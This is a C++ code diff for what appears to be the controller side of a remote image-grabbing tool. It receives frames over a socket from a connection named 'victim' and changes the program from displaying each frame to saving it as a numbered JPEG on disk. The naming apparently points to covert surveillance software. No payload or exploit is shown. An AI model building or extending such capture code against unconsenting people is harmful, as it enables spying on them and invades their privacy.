@@ -2,9 +2,10 @@
 #include "connections.hpp"
 #include <vector>
 #include <cstring>
+#include <string>
 #include <opencv2/opencv.hpp>
 #define port "23112"
-#define size_transfer 4096
+unsigned int frame_number = 0;
 
 bool try_to_get_image(std::vector<char> buffer)
 {
@@ -16,7 +17,11 @@ bool try_to_get_image(std::vector<char> buffer)
     }
     if (!img.empty())
     {
-        cv::imshow("window_viewer", img);
+        frame_number++;
+        std::string path = "C:\\frames_grabbed\\frame";
+        path+= std::to_string(frame_number);
+        path+= ".jpg";
+        cv::imwrite(path,img);
         return true;
     }
     else
@@ -58,7 +63,6 @@ int main()
 {
     SOCKET victim = connect_to_client(port);
     int r = 0;
-    cv::namedWindow("window_viewer");
     while (true)
     {
         size_t size;
@@ -79,9 +83,6 @@ int main()
         {
             error("no se pudo interpretar los datos", -1);
         }
-        //TODO: reemplazar esto por alguna libreria grafica
-        cv::waitKey(0);
-        cv::destroyAllWindows();
     }
 
     return 0;
